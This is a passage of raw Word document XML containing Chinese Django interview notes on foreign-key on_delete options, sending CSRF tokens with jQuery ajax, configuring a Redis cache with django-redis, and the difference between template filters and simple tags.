          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>null</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57895E6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SET_DEFAULT</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：此值设置，会把设置为外键的默认值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF7DD0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SET()</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：此值设置，会调用外面的值，可以是一个函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0AF117" w14:textId="439C3DFE"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一般情况下使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>CASCADE</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就可以了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="565E374E" w14:textId="30FC27FB"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042</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基于</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使用</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>发送</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>请求时，都可以使用哪种方法携带</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>csrf token</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777C8FD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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式一给每个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都加上上请求头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00A60EA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function Do1(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8D12A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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28127A4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url:"/index/",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E9A55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data:{id:1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097A147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type:'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6FE2B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data:{csrfmiddlewaretoken:'{{ csrf_token }}',name:'alex'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5A276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success:function(data){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A683D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console.log(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061CBED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17D177D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59EEA4F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333B138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7C69420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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式二：需要先下载</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jQuery-cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，才能去</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中获取</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>token</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1665B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function Do1(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F49552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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B53B4A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url:"/index/",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2545053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data:{id:1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E6C7F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type:'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2791D0D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headers:{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2005322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'X-CSRFToken':$.cookie('csrftoken')  // </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>去</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中获取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0261D38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7DFD390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success:function(data){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768106C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console.log(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EEEC7C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397401E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3278D8A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611B3B5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CBFF11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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式三：搞个函数</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ajaxSetup</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，当有多的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ajax</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求，即会执行这个函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A91B91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$.ajaxSetup({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6376227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beforeSend:function (xhr,settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4615D04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xhr.setRequestHeader("X-CSRFToken",$.cookie('csrftoken'))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE5115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p>
    <w:p w14:paraId="67D6D14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3727841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0203EE8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函数版本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BE382E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&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122165B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&lt;input type="button" onclick="Do1();"  value="Do it"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2647AB7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&lt;input type="button" onclick="Do2();"  value="Do it"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268AD95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&lt;input type="button" onclick="Do3();"  value="Do it"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C0ACE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75B6130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&lt;script src="/static/jquery-3.3.1.min.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6503D53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&lt;script src="/static/jquery.cookie.js"&gt;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F17A6A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&lt;script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296212D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$.ajaxSetup({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327898D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beforeSend: function(xhr, settings) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="578C63C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xhr.setRequestHeader("X-CSRFToken", $.cookie('csrftoken'));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FDD4DF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804FA2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61FDD34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19F499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function Do1(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D64CC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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564BD62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url:"/index/",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3663F6B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data:{id:1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FD25D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type:'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A2AF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success:function(data){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2941483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console.log(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="487C2FC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5F4208A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3522E2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2C17F5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43DDE2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function Do2(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64816B7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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54038CF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url:"/index/",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2744B5E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data:{id:1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1204342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type:'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46512A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success:function(data){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CF165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console.log(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D99FFA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7F2361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1210CFB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9FD796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7C26F05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function Do3(){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDEC22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$.ajax({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CAFA8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url:"/index/",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFAEFD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data:{id:1},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ECF747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type:'POST',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07B44B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success:function(data){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACEDAB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console.log(data);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAA57C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DF571D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1C1C053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7A00E1D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&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787594B6" w14:textId="6A6358E9"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&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027E92B1" w14:textId="3C0F8716"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045</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的缓存能使用</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>吗？如果可以的话，如何配置？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCE4C5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pip install django-redis  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2152AC3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apt-get install redis-serv</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA5EDA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279B35E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在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>setting</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>添加配置文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086F99B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CACHES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C69B1B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"default": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD2987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"BACKEND": "django_redis.cache.RedisCache", # </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>缓存类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532FB37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"LOCATION": "127.0.0.1:6379", # ip</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>端口</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6803E85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"OPTIONS": {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F4455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"CLIENT_CLASS": "django_redis.client.DefaultClient",  #</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E14F33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"CONNECTION_POOL_KWARGS": {"max_connections": 100} # </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>连接池最大连接数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C48D3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"PASSWORD": "</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>密码</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536AE60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4706787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5E48981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p>
    <w:p w14:paraId="21FEA36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40CFC7D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7E315A2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使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465C004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django.shortcuts import render,HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52837E8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django_redis import get_redis_connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1999FFF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43FDC1C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index(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FF023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根据名字去连接池中获取连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A04266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conn = get_redis_connection("default")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C415EE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conn.hset('n1','k1','v1') # </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>存数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B68D16" w14:textId="73049AD2"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return HttpResponse('...')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E13394E" w14:textId="631E85F8" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00DA2E3D"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047</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的模板中</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>filter</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simple_tag</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBA8EC5" w14:textId="77777777" w:rsidR="00BA4DA9" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BA4DA9"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filter: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>过滤器，只能接受两个参数，第一个参数是</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前的数据。</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用于操作变量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C03C84C" w14:textId="77777777" w:rsidR="00BA4DA9" w:rsidRPr="00BC0D9A" w:rsidRDefault="00BA4DA9"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simple_tag: </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>标签（简单标签）。</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用于操作模板模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45233420"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1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、模板继承：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>{ % extends 'layouts.html' %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE584BC"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、自定义方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E527BBC"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'filter'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：只能传递两个参数，可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>if</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for</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句中使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AE0E8B"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'simple_tag'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：可以无线传参，不能在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>if for</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570101BE" w14:textId="77777777" w:rsidR="00D8288D"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'inclusion_tags'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：可以使用模板和后端数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F135FF" w14:textId="3870B5F3"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3</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、防</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
